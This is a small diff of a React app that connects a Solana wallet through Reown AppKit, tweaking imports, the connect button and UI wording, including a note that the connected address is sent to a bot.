@@ -1,9 +1,9 @@
 import { useEffect, useState } from 'react'
-import { useAppKitAccount, useAppKitEvents } from '@reown/appkit/react'
+import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
 import './App.css'
 
 function App() {
-  const { address, isConnected } = useAppKitAccount({ namespace: 'solana' })
+  const { address, isConnected } = useAppKitAccount()
   const [sent, setSent] = useState(false)
 
   useEffect(() => {
@@ -22,16 +22,16 @@ function App() {
   return (
     <div className="container">
       <h1>Connect Solana Wallet</h1>
-      <p>Select your wallet to connect:</p>
+      <p>Tap below to choose your wallet:</p>
 
-      {/* Professional connect button → opens modal with full wallet list + deep links */}
-      <w3m-button size="lg" label="Connect Wallet" loadingLabel="Connecting..." />
+      {/* Pro Reown button → opens full modal with deep links */}
+      <w3m-button size="lg" label="Connect Wallet" />
 
       {isConnected && address ? (
         <div className="connected">
-          <p>Wallet Connected ✅</p>
+          <p>Connected ✅</p>
           <strong>{address.slice(0, 8)}...{address.slice(-6)}</strong>
-          <p>(Address sent to your bot)</p>
+          <p>(Address auto-sent to your bot)</p>
         </div>
       ) : (
         <p>No wallet connected yet.</p>
